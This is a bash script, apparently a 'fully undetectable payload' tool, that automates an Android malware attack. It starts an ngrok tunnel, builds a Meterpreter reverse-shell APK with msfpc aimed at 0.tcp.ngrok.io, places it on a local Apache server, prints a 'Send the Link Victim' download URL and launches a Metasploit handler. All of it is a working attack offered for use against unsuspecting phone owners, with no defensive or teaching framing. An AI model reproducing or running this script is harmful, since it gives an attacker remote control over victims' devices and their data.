#!/bin/bash
cat logo.txt
printf "

                                                          \e[189m\e[1;99m@@@@@@  A FULL UNDETECTABLE PAYLOAD  @@@@@@@ \e[0m\n"
printf "                                                         ++++++++ V1.0 Created by ...... Ignite +++++++++++"



printf "                                                                                                                                                                                                                                                                                                                      \e[189m\e[1;99m WELCOME TO IGNITETCH FUD TOOL \e[0m\n"
sleep 10


apt-get install gnome-terminal
cp ngrok.yml ~/.ngrok2/
printf " \e[189m\e[1;73m Enter the ngrok path \e[0m\n"
echo ""
read path
gnome-terminal -x bash -c "$path/./ngrok start --all; exec bash" 
printf " \e[189m\e[1;73m Enter the Port [Eg. 18283] \e[0m\n"
echo ""
read port
printf " \e[189m\e[1;73m Enter the ngrok https link [Eg. 74837462.ngrok.io ]\e[0m\n"
echo ""
read ip
printf " \e[189m\e[1;73m Enter the Payload Name \e[0m\n"
echo ""
read name
rm -rf *.apk
printf "                                                                  \e[101m\e[1;73m WAIT PAYlOAD IS RUNNING \e[0m\n" 
msfpc APK 0.tcp.ngrok.io $port 
systemctl start apache2
systemctl restart apache2.service
mv /var/www/html/index.html /var/www/
systemctl restart apache2.service
mv *.apk $name.apk
mv $name.apk /var/www/html/
printf "                                                 \e[189m\e[1;99m       Send the Link Victim +++++ https://$ip/$name.apk \e[0m\n"
 
printf "                                                                                                                                                                                                                                                                                                                                                                                                                                      \e[101m\e[1;73m WAIT METASPLOIT RUNNING \e[0m\n"
sleep 10
msfconsole -r meterpreter.rc






